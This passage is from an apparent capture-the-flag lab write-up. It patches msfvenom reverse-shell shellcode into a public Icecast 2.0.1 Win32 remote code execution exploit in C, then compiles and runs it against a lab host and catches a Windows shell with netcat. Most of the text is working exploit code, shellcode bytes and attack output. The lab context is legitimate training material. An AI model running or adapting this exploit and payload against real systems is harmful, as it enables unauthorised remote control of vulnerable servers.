"\x9c\x24\x62\x8a\x37\xdf\xe5\xbf\xc3\xa8\xe8\xd7\xc9\x56"
"\x12\x93\x47\xb0\x7e\xf3\x01\x6b\x17\x6a\x08\xe7\x86\x73"
"\x86\x82\x89\xf8\x25\x73\x47\x09\x43\x67\x30\xf9\x1e\xd5"
"\x97\x06\xb5\x71\x7b\x94\x52\x81\xf2\x85\xcc\xd6\x53\x7b"
"\x05\xb2\x49\x22\xbf\xa0\x93\xb2\xf8\x60\x48\x07\x06\x69"
"\x1d\x33\x2c\x79\xdb\xbc\x68\x2d\xb3\xea\x26\x9b\x75\x45"
"\x89\x75\x2c\x3a\x43\x11\xa9\x70\x54\x67\xb6\x5c\x22\x87"
"\x07\x09\x73\xb8\xa8\xdd\x73\xc1\xd4\x7d\x7b\x18\x5d\x9d"
"\x9e\x88\xa8\x36\x07\x59\x11\x5b\xb8\xb4\x56\x62\x3b\x3c"
"\x27\x91\x23\x35\x22\xdd\xe3\xa6\x5e\x4e\x86\xc8\xcd\x6f"
"\x83";
```
{% endraw %}

<br />
Update the exploit with the new, new payload.

{% raw %}
```c
<snip>

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

#ifdef WIN32 
#pragma comment(lib, "ws2_32.lib") 
    #include <winsock.h> 
    #include "winerr.h" 

    #define close closesocket 
#else 
    #include <unistd.h> 
    #include <sys/socket.h> 
    #include <sys/types.h> 
    #include <arpa/inet.h> 
    #include <netdb.h> 
    #include <netinet/in.h> 
#endif 

#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ 2048 
#define TIMEOUT 3 
#define EXEC    "GET / HTTP/1.0\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "\xcc" 

// msfvenom -p windows/shell_reverse_tcp LHOST=10.4.119.29 LPORT=443 ExitFunc=thread -f c -v shellcode -b '\x0a\x0d\x00'
unsigned char shellcode[] = 
"\xd9\xf7\xbe\x64\x8f\xb7\xc4\xd9\x74\x24\xf4\x5f\x33\xc9"
"\xb1\x52\x31\x77\x17\x83\xef\xfc\x03\x13\x9c\x55\x31\x27"
"\x4a\x1b\xba\xd7\x8b\x7c\x32\x32\xba\xbc\x20\x37\xed\x0c"
"\x22\x15\x02\xe6\x66\x8d\x91\x8a\xae\xa2\x12\x20\x89\x8d"
"\xa3\x19\xe9\x8c\x27\x60\x3e\x6e\x19\xab\x33\x6f\x5e\xd6"
"\xbe\x3d\x37\x9c\x6d\xd1\x3c\xe8\xad\x5a\x0e\xfc\xb5\xbf"
"\xc7\xff\x94\x6e\x53\xa6\x36\x91\xb0\xd2\x7e\x89\xd5\xdf"
"\xc9\x22\x2d\xab\xcb\xe2\x7f\x54\x67\xcb\x4f\xa7\x79\x0c"
"\x77\x58\x0c\x64\x8b\xe5\x17\xb3\xf1\x31\x9d\x27\x51\xb1"
"\x05\x83\x63\x16\xd3\x40\x6f\xd3\x97\x0e\x6c\xe2\x74\x25"
"\x88\x6f\x7b\xe9\x18\x2b\x58\x2d\x40\xef\xc1\x74\x2c\x5e"
"\xfd\x66\x8f\x3f\x5b\xed\x22\x2b\xd6\xac\x2a\x98\xdb\x4e"
"\xab\xb6\x6c\x3d\x99\x19\xc7\xa9\x91\xd2\xc1\x2e\xd5\xc8"
"\xb6\xa0\x28\xf3\xc6\xe9\xee\xa7\x96\x81\xc7\xc7\x7c\x51"
"\xe7\x1d\xd2\x01\x47\xce\x93\xf1\x27\xbe\x7b\x1b\xa8\xe1"
"\x9c\x24\x62\x8a\x37\xdf\xe5\xbf\xc3\xa8\xe8\xd7\xc9\x56"
"\x12\x93\x47\xb0\x7e\xf3\x01\x6b\x17\x6a\x08\xe7\x86\x73"
"\x86\x82\x89\xf8\x25\x73\x47\x09\x43\x67\x30\xf9\x1e\xd5"
"\x97\x06\xb5\x71\x7b\x94\x52\x81\xf2\x85\xcc\xd6\x53\x7b"
"\x05\xb2\x49\x22\xbf\xa0\x93\xb2\xf8\x60\x48\x07\x06\x69"
"\x1d\x33\x2c\x79\xdb\xbc\x68\x2d\xb3\xea\x26\x9b\x75\x45"
"\x89\x75\x2c\x3a\x43\x11\xa9\x70\x54\x67\xb6\x5c\x22\x87"
"\x07\x09\x73\xb8\xa8\xdd\x73\xc1\xd4\x7d\x7b\x18\x5d\x9d"
"\x9e\x88\xa8\x36\x07\x59\x11\x5b\xb8\xb4\x56\x62\x3b\x3c"
"\x27\x91\x23\x35\x22\xdd\xe3\xa6\x5e\x4e\x86\xc8\xcd\x6f"
"\x83";

<snip>
```
{% endraw %}

<br />
Compile the new exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
└─$ gcc ./568-edit.c -o 568 && chmod 775 ./568
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
└─$ ./568 10.10.108.247            

Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 10.10.108.247:8000
- send malformed data

Server IS vulnerable!!!
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/ice/new3]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.108.247] 49281
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>
```
{% endraw %}

<br />
Well, it looks like we put this one an ice, including the extra credit...sort of.  Hopefully, you enjoyed the read.  See you in the next one.